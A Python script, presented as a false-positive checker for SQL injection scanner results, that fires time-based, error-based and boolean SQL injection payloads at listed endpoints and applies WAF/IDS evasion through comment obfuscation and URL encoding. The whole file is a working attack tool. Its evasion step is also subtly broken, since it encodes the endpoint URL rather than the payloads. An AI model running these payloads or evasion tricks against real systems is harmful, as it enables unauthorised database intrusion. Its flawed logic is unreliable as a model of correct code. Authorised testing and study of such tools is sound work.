import argparse
import requests
import time

# Define payloads and evasion techniques
payloads = {
    "time_based": "'; WAITFOR DELAY '0:0:5'--",
    "logical_error": "'; SELECT 1/0--",
    "boolean_based_true": "' OR '1'='1'--",
    "boolean_based_false": "' OR '1'='2'--"
}

evasion_techniques = [
    lambda payload: payload.replace(" ", "/**/"),  # SQL comment obfuscation
    lambda payload: payload.replace("'", "%27"),  # URL encoding single quote
    lambda payload: payload.replace(";", "%3B")   # URL encoding semicolon
]

def detect_waf(endpoint):
    """
    Detect if the endpoint is protected by a WAF/IPS/IDS.
    """
    test_payload = "' OR '1'='1"
    try:
        response = requests.get(endpoint + test_payload)
        if response.status_code in [403, 406]:  # Common WAF/IPS/IDS responses
            print("WAF/IPS/IDS detected.")
            return True
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
    return False

def evade_detection(payload):
    """
    Apply evasion techniques to the payload.
    """
    for technique in evasion_techniques:
        payload = technique(payload)
    return payload

def test_time_based(endpoint):
    print("Testing time-based payload.")
    start_time = time.time()
    try:
        response = requests.get(endpoint + payloads["time_based"])
        elapsed_time = time.time() - start_time
        if elapsed_time > 5:
            print("Time-based payload indicates vulnerability.")
            return True
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
    return False

def test_logical_error(endpoint):
    print("Testing logical error payload.")
    try:
        response = requests.get(endpoint + payloads["logical_error"])
        if response.status_code == 500:
            print("Logical error payload indicates vulnerability.")
            return True
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
    return False

def test_boolean_based(endpoint):
    print("Testing boolean-based payloads.")
    try:
        true_response = requests.get(endpoint + payloads["boolean_based_true"])
        false_response = requests.get(endpoint + payloads["boolean_based_false"])
        if true_response.text != false_response.text:
            print("Boolean-based payloads indicate vulnerability.")
            return True
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
    return False

def verify_false_positive(endpoint):
    """
    Verify if an endpoint is a false positive by using diverse payloads.
    """
    if test_time_based(endpoint) or test_logical_error(endpoint) or test_boolean_based(endpoint):
        return True
    return False

def main(scanner_output_file, output_file):
    with open(scanner_output_file, 'r') as f:
        scanner_results = [line.strip().split() for line in f]

    final_results = []

    for endpoint, status in scanner_results:
        print(f"Checking endpoint: {endpoint} with status: {status}")
        if detect_waf(endpoint):
            print("Applying evasion techniques.")
            endpoint = evade_detection(endpoint)
        
        if status == 'Vulnerable':
            if verify_false_positive(endpoint):
                final_results.append((endpoint, 'Vulnerable'))
            else:
                final_results.append((endpoint, 'False Positive'))
        else:
            final_results.append((endpoint, 'Not Vulnerable'))

    with open(output_file, 'w') as f:
        for endpoint, status in final_results:
            f.write(f"{endpoint}: {status}\n")

    print(f"Results saved to {output_file}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="False Positive SQL Injection Checker")
    parser.add_argument("-i", "--input", required=True, help="File containing scanner results")
    parser.add_argument("-o", "--output", required=True, help="Output file to save final results")

    args = parser.parse_args()

    main(args.input, args.output)
